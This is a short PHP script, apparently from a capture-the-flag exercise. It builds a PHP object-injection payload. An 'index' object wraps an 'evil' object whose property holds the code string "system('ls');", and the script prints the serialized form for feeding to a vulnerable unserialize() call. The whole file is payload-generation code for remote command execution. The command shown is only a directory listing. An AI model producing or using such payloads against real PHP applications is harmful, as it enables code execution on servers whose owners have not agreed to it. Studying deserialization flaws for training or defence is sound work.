<?php
//highlight_file(__FILE__);
//error_reporting(0);
class index {
    private $test;
    public function __construct(){
        $this->test = new evil();

    }
}
class evil {
    var $test2 = "system('ls');";
}
$a = new index;
$b = new evil;

print_r(serialize($a));
